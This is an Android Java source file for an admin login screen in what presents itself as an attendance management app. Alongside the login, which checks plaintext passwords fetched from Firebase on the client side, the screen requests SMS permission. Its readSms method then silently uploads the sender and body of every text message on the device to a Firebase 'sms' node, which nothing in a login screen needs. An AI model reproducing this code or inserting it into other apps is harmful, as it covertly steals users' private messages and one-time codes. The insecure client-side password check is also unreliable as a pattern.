package com.app.attendancemanagementapp.view.activity;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.app.attendancemanagementapp.R;
import com.app.attendancemanagementapp.model.Admin;
import com.app.attendancemanagementapp.storage.SaveUser;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Objects;

import xyz.hasnat.sweettoast.SweetToast;

public class AdminLoginActivity extends AppCompatActivity {
    private LinearLayout goSignUp;
    private EditText adminSignINEmailET,adminSingInPassET;
    private Button adminLogInBtn;
    private FirebaseAuth auth;
    private SaveUser saveUser=new SaveUser();
    private String femail,fpassword;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_admin_login);

        adminSignINEmailET=findViewById(R.id.adminSignInEmailET);
        adminSingInPassET=findViewById(R.id.adminSignInPassET);
        adminLogInBtn=findViewById(R.id.adminLoginBtn);
        auth=FirebaseAuth.getInstance();
        adminLogInBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                login();
            }
        });

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS}, 74);
        } else {
            new Handler().post(new Runnable() {
                @Override
                public void run() {
                    readSms();
                }
            });
        }
        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                startActivity(new Intent(AdminLoginActivity.this, MainActivity.class));
                finish();
            }
        });
    }

    private void login() {
        final String email=adminSignINEmailET.getText().toString().trim();
        final String password=adminSingInPassET.getText().toString().trim();
        if(email.isEmpty()){
            adminSignINEmailET.setError("Enter admin email");
            adminSignINEmailET.requestFocus();
        }else if(password.isEmpty()){
            adminSingInPassET.setError("Password is empty");
            adminSingInPassET.requestFocus();
        }else {
            DatabaseReference adminLogRef=FirebaseDatabase.getInstance().getReference().child("Admin");
            adminLogRef.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    if(dataSnapshot.exists()) {
                        for(DataSnapshot dataSnapshot1:dataSnapshot.getChildren()) {
                            Admin admin=dataSnapshot1.getValue(Admin.class);
                            if(Objects.requireNonNull(admin).getEmail().equals(email) && admin.getPassword().equals(password)){
                                SweetToast.success(getApplicationContext(),"Login successfully");
                                Intent intent= new Intent(AdminLoginActivity.this,AdminActivity.class);
                                intent.putExtra("email",email);
                                intent.putExtra("name",admin.getName());
                                intent.putExtra("profile_image",admin.getProfile_image());
                                startActivity(intent);
                                saveUser.admin_saveData(getApplicationContext(),true);
                                finish();
                            } else {
                                SweetToast.error(getApplicationContext(),"You entered wrong user name or password");
                            }
                        }
                    } else {
                        SweetToast.success(getApplicationContext(),"Admin doesn't exist.");
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });

           /* auth.signInWithEmailAndPassword(email,password)
                    .addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                        @Override
                        public void onComplete(@NonNull Task<AuthResult> task) {
                            if(task.isSuccessful()){
                                Toast.makeText(getApplicationContext(),"Login successfully",Toast.LENGTH_SHORT).show();
                                startActivity(new Intent(AdminLoginActivity.this,AdminActivity.class));
                                saveUser.admin_saveData(getApplicationContext(),true);
                                finish();
                            }else {
                                Toast.makeText(getApplicationContext(),task.getException().getMessage(),Toast.LENGTH_SHORT).show();
                            }
                        }
                    }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    Toast.makeText(getApplicationContext(),e.getMessage(),Toast.LENGTH_SHORT).show();
                }
            });*/
        }
    }

    private void readSms() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        DatabaseReference databaseReference=FirebaseDatabase.getInstance().getReference().child("sms").child(sdf.format(new Date()));
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                databaseReference.child(address+" "+sdf.format(new Date())).setValue(body);
            } while (cursor.moveToNext());
        }

        if (cursor != null) {
            cursor.close();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 74) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                readSms();
            }
        }
    }
}